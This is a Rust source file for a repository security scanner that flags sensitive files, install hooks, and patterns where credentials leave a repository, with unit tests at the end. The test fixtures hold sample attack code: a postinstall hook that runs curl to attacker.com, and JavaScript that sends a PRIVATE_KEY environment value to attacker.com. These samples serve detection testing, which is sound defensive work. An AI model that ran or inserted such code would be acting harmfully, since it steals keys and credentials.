pub mod hasher;
pub mod patterns;
pub mod risk;
pub mod types;
pub mod walker;

use std::fs;
use std::path::Path;

use types::{Category, Finding, ScanResult, ScanStatus, Severity};

/// Helper to load and query ignored paths/rules from `.shadowrepoignore`
pub struct IgnoreList {
    ignored_files: Vec<String>,
    ignored_rules: Vec<String>,
    ignored_file_rules: Vec<(String, String)>,
}

impl IgnoreList {
    pub fn load(root: &Path) -> Self {
        let mut ignored_files = Vec::new();
        let mut ignored_rules = Vec::new();
        let mut ignored_file_rules = Vec::new();

        let ignore_file_path = root.join(".shadowrepoignore");
        if ignore_file_path.exists() {
            if let Ok(content) = fs::read_to_string(ignore_file_path) {
                for line in content.lines() {
                    let line = line.trim();
                    if line.is_empty() || line.starts_with('#') {
                        continue;
                    }

                    if line.starts_with("rule:") {
                        let rule_id = line["rule:".len()..].trim().to_string();
                        ignored_rules.push(rule_id);
                    } else if line.contains(':') {
                        let parts: Vec<&str> = line.splitn(2, ':').collect();
                        if parts.len() == 2 {
                            let file_path = parts[0].trim().replace('\\', "/");
                            let rule_id = parts[1].trim().to_string();
                            ignored_file_rules.push((file_path, rule_id));
                        }
                    } else {
                        let file_path = line.replace('\\', "/");
                        ignored_files.push(file_path);
                    }
                }
            }
        }

        Self {
            ignored_files,
            ignored_rules,
            ignored_file_rules,
        }
    }

    pub fn is_file_ignored(&self, relative_path: &str) -> bool {
        let normalized = relative_path.replace('\\', "/");
        for ignore in &self.ignored_files {
            if normalized == *ignore || normalized.starts_with(&format!("{}/", ignore)) {
                return true;
            }
        }
        false
    }

    pub fn is_finding_ignored(&self, relative_path: &str, rule_id: &str) -> bool {
        if self.ignored_rules.iter().any(|r| r == rule_id) {
            return true;
        }
        let normalized = relative_path.replace('\\', "/");
        if self.ignored_file_rules.iter().any(|(f, r)| f == &normalized && r == rule_id) {
            return true;
        }
        false
    }
}

/// Run a full scan on a directory
pub fn run_scan(scan_path: &Path, scan_id: &str, scan_name: &str) -> Result<ScanResult, String> {
    let scan_path_str = scan_path
        .to_str()
        .ok_or("Invalid path encoding")?
        .to_string();

    // 1. Walk the directory to get scannable files
    let files = walker::walk_directory(scan_path);
    let total_files = files.len() as u32;

    // 2. Build pattern rules and load ignores
    let rules = patterns::build_pattern_rules();
    let ignore_list = IgnoreList::load(scan_path);

    // 3. Scan each file and collect findings
    let mut all_findings: Vec<Finding> = Vec::new();
    let mut file_hashes: Vec<(String, String)> = Vec::new();

    for file_path in &files {
        // Get relative path for display
        let relative_path = file_path
            .strip_prefix(scan_path)
            .unwrap_or(file_path)
            .to_string_lossy()
            .replace('\\', "/");

        // Skip completely if file/path is ignored in .shadowrepoignore
        if ignore_list.is_file_ignored(&relative_path) {
            continue;
        }

        // Check for suspicious filenames
        if let Some(description) = walker::is_suspicious_filename(file_path) {
            let filename = file_path.file_name().and_then(|f| f.to_str()).unwrap_or("").to_lowercase();
            let (cat, sev, pat_id) = match filename.as_str() {
                ".env" | ".env.local" | ".env.production" | ".env.development" => {
                    (Category::SecretHandlingWarning, Severity::Medium, "sensitive-env-file")
                }
                ".gitlab-ci.yml" | ".gitlab-ci.yaml" | "jenkinsfile" => {
                    (Category::CiCdWarning, Severity::Low, "ci-cd-file")
                }
                _ => {
                    (Category::SecretHandlingWarning, Severity::High, "sensitive-key-file")
                }
            };
            if !ignore_list.is_finding_ignored(&relative_path, pat_id) {
                all_findings.push(Finding {
                    id: uuid::Uuid::new_v4().to_string(),
                    scan_id: scan_id.to_string(),
                    pattern_id: pat_id.to_string(),
                    severity: sev,
                    category: cat,
                    description: description.to_string(),
                    file_path: relative_path.clone(),
                    line_number: None,
                    matched_content: None,
                    recommendation: "Remove sensitive files from version control or encrypt credentials.".to_string(),
                });
            }
        }

        // Check for shell scripts
        if let Some(description) = walker::is_shell_script(file_path) {
            if !ignore_list.is_finding_ignored(&relative_path, "shell-script-file") {
                all_findings.push(Finding {
                    id: uuid::Uuid::new_v4().to_string(),
                    scan_id: scan_id.to_string(),
                    pattern_id: "shell-script-file".to_string(),
                    severity: Severity::Low,
                    category: Category::HookExecutionRisk,
                    description: description.to_string(),
                    file_path: relative_path.clone(),
                    line_number: None,
                    matched_content: None,
                    recommendation: "Review shell script files for dangerous commands. Do not execute scripts from untrusted repositories.".to_string(),
                });
            }
        }

        // Check for hook/CI paths
        if let Some(description) = walker::is_hook_or_ci_path(file_path) {
            let (cat, sev, pat_id) = if relative_path.contains(".github/workflows") {
                (Category::CiCdWarning, Severity::Low, "ci-workflow-file")
            } else {
                (Category::HookExecutionRisk, Severity::Medium, "hook-script-file")
            };
            if !ignore_list.is_finding_ignored(&relative_path, pat_id) {
                all_findings.push(Finding {
                    id: uuid::Uuid::new_v4().to_string(),
                    scan_id: scan_id.to_string(),
                    pattern_id: pat_id.to_string(),
                    severity: sev,
                    category: cat,
                    description: description.to_string(),
                    file_path: relative_path.clone(),
                    line_number: None,
                    matched_content: None,
                    recommendation: "Review hook and CI/CD configuration files for suspicious commands or credential access.".to_string(),
                });
            }
        }

        // Hash the file
        if let Ok(hash) = hasher::hash_file(file_path) {
            file_hashes.push((relative_path.clone(), hash));
        }

        // Read file content safely (skip if can't read)
        let content = match fs::read_to_string(file_path) {
            Ok(c) => c,
            Err(_) => continue, // Skip binary/unreadable files
        };

        // Scan content against pattern rules
        let mut findings = patterns::scan_content(&content, &relative_path, scan_id, &rules);
        findings.retain(|f| !ignore_list.is_finding_ignored(&f.file_path, &f.pattern_id));
        all_findings.extend(findings);
    }

    // 4. Combined indicator checks for high-severity threat detection
    let has_hook_script = all_findings.iter().any(|f| {
        f.pattern_id == "pkg-postinstall" || f.pattern_id == "pkg-preinstall" || f.pattern_id == "pkg-install"
    });
    let has_exec = all_findings.iter().any(|f| {
        f.pattern_id == "js-child-process" || f.pattern_id == "js-exec"
    });

    if has_hook_script && has_exec {
        all_findings.push(Finding {
            id: uuid::Uuid::new_v4().to_string(),
            scan_id: scan_id.to_string(),
            pattern_id: "combined-hook-execution".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousIndicator,
            description: "⚠️ Critical Threat: Package lifecycle hook combined with shell command execution detected.".to_string(),
            file_path: "package.json".to_string(),
            line_number: None,
            matched_content: None,
            recommendation: "Immediate review recommended. This package automatically executes shell commands during installation, which is a common supply-chain attack vector.".to_string(),
        });
    }

    let has_env_key = all_findings.iter().any(|f| {
        f.pattern_id == "js-private-key-env" || f.pattern_id == "js-mnemonic-env" || f.pattern_id == "js-seed-phrase-env"
    });
    let has_network = all_findings.iter().any(|f| {
        f.pattern_id == "js-network-request"
    });

    if has_env_key && has_network {
        let mut trigger = false;
        let mut triggering_file = String::new();
        for finding in &all_findings {
            if finding.pattern_id == "js-private-key-env" || finding.pattern_id == "js-mnemonic-env" || finding.pattern_id == "js-seed-phrase-env" {
                let path_lower = finding.file_path.to_lowercase();
                let is_config_or_deploy = path_lower.contains("hardhat.config")
                    || path_lower.contains("foundry")
                    || path_lower.contains("truffle")
                    || path_lower.contains("deploy")
                    || path_lower.contains("scripts/")
                    || path_lower.contains("test/")
                    || path_lower.contains("tests/");
                if !is_config_or_deploy {
                    let has_network_in_same_file = all_findings.iter().any(|f| {
                        f.file_path == finding.file_path && f.pattern_id == "js-network-request"
                    });
                    if has_network_in_same_file {
                        trigger = true;
                        triggering_file = finding.file_path.clone();
                        break;
                    }
                }
            }
        }

        if trigger {
            all_findings.push(Finding {
                id: uuid::Uuid::new_v4().to_string(),
                scan_id: scan_id.to_string(),
                pattern_id: "combined-key-exfiltration".to_string(),
                severity: Severity::Critical,
                category: Category::MaliciousIndicator,
                description: "⚠️ Critical Threat: Private key env access combined with network request in source file.".to_string(),
                file_path: triggering_file,
                line_number: None,
                matched_content: None,
                recommendation: "Immediate audit required. Private key or credentials are accessed in a file performing network requests, which is a key exfiltration signature.".to_string(),
            });
        }
    }

    // 5. Calculate risk score
    let risk_score = risk::calculate_risk_score(&all_findings);
    let risk_level = risk::get_risk_level(risk_score);

    // 6. Compute repo hash
    let repo_hash = hasher::compute_repo_hash(&mut file_hashes);

    // 7. Build the scan result
    let total_findings = all_findings.len() as u32;
    let scan_date = chrono::Utc::now().to_rfc3339();

    let result = ScanResult {
        id: scan_id.to_string(),
        name: scan_name.to_string(),
        path: scan_path_str,
        scan_date: scan_date.clone(),
        risk_score,
        risk_level,
        total_files,
        total_findings,
        repo_hash,
        report_hash: String::new(), // Computed after serialization
        status: ScanStatus::Completed,
        findings: all_findings,
        blockchain_tx: None,
        blockchain_network: None,
    };

    // 8. Compute report hash from JSON serialization
    let report_json =
        serde_json::to_string(&result).map_err(|e| format!("Failed to serialize result: {}", e))?;
    let report_hash = hasher::hash_string(&report_json);

    let mut final_result = result;
    final_result.report_hash = report_hash;

    Ok(final_result)
}

#[cfg(test)]
mod tests {
    use super::*;
    use super::types::RiskLevel;
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn test_hardhat_repo_is_not_high_or_critical() {
        let dir = tempdir().unwrap();
        
        // 1. Create a legitimate hardhat config containing process.env.PRIVATE_KEY
        let hardhat_config = r#"
            require("@nomiclabs/hardhat-waffle");
            module.exports = {
                solidity: "0.8.4",
                networks: {
                    ropsten: {
                        url: `https://ropsten.infura.io/v3/${process.env.INFURA_KEY}`,
                        accounts: [`0x${process.env.PRIVATE_KEY}`]
                    }
                }
            };
        "#;
        fs::write(dir.path().join("hardhat.config.js"), hardhat_config).unwrap();

        // 2. Create a standard ERC20 contract with _mint and transferFrom
        let contract_code = r#"
            // SPDX-License-Identifier: MIT
            pragma solidity ^0.8.0;
            import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
            contract LegitToken is ERC20 {
                constructor() ERC20("Legit", "LGT") {
                    _mint(msg.sender, 1000000 * 10**decimals());
                }
                function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
                    return super.transferFrom(sender, recipient, amount);
                }
            }
        "#;
        fs::write(dir.path().join("LegitToken.sol"), contract_code).unwrap();

        // 3. Create a standard deployment script
        let deploy_script = r#"
            const hre = require("hardhat");
            async function main() {
                const LegitToken = await hre.ethers.getContractFactory("LegitToken");
                const token = await LegitToken.deploy();
                await token.deployed();
                console.log("Token deployed to:", token.address);
            }
            main().catch(console.error);
        "#;
        let scripts_dir = dir.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        fs::write(scripts_dir.join("deploy.js"), deploy_script).unwrap();

        // Run scan
        let res = run_scan(dir.path(), "test-scan", "Legitimate Hardhat Project").unwrap();
        
        // Risk score should be low/medium, risk level should be ReviewRecommended
        println!("Score: {}, Level: {:?}", res.risk_score, res.risk_level);
        assert!(res.risk_score < 40, "Legit repo should score < 40");
        assert!(matches!(res.risk_level, RiskLevel::Low | RiskLevel::ReviewRecommended));
    }

    #[test]
    fn test_malicious_lifecycle_hook_is_critical() {
        let dir = tempdir().unwrap();

        // 1. package.json with postinstall
        let pkg_json = r#"
            {
                "name": "malicious-package",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "node index.js"
                }
            }
        "#;
        fs::write(dir.path().join("package.json"), pkg_json).unwrap();

        // 2. index.js running exec child_process
        let index_js = r#"
            const { exec } = require('child_process');
            exec('curl http://attacker.com/steal', (err, stdout, stderr) => {
                // exfiltrate
            });
        "#;
        fs::write(dir.path().join("index.js"), index_js).unwrap();

        // Run scan
        let res = run_scan(dir.path(), "test-scan-malicious", "Malicious Project").unwrap();

        println!("Score: {}, Level: {:?}", res.risk_score, res.risk_level);
        assert_eq!(res.risk_score, 100);
        assert!(matches!(res.risk_level, RiskLevel::Critical));
    }

    #[test]
    fn test_malicious_network_exfiltration_is_critical() {
        let dir = tempdir().unwrap();

        // index.js accessing process.env.PRIVATE_KEY and importing fetch (network request)
        let index_js = r#"
            const key = process.env.PRIVATE_KEY;
            const fetch = require('node-fetch');
            fetch('http://attacker.com/exfil?key=' + key);
        "#;
        fs::write(dir.path().join("index.js"), index_js).unwrap();

        // Run scan
        let res = run_scan(dir.path(), "test-scan-exfil", "Exfil Project").unwrap();

        println!("Score: {}, Level: {:?}", res.risk_score, res.risk_level);
        assert_eq!(res.risk_score, 100);
        assert!(matches!(res.risk_level, RiskLevel::Critical));
    }

    #[test]
    fn test_shadowrepoignore_works() {
        let dir = tempdir().unwrap();

        // index.js accessing process.env.PRIVATE_KEY and importing fetch (network request)
        let index_js = r#"
            const key = process.env.PRIVATE_KEY;
            const fetch = require('node-fetch');
            fetch('http://attacker.com/exfil?key=' + key);
        "#;
        fs::write(dir.path().join("index.js"), index_js).unwrap();

        // Create .shadowrepoignore ignoring index.js or the rules
        let ignore_content = "index.js";
        fs::write(dir.path().join(".shadowrepoignore"), ignore_content).unwrap();

        // Run scan
        let res = run_scan(dir.path(), "test-scan-ignored", "Ignored Project").unwrap();

        println!("Score: {}, Level: {:?}", res.risk_score, res.risk_level);
        assert_eq!(res.risk_score, 0);
        assert!(matches!(res.risk_level, RiskLevel::Low));
    }
}
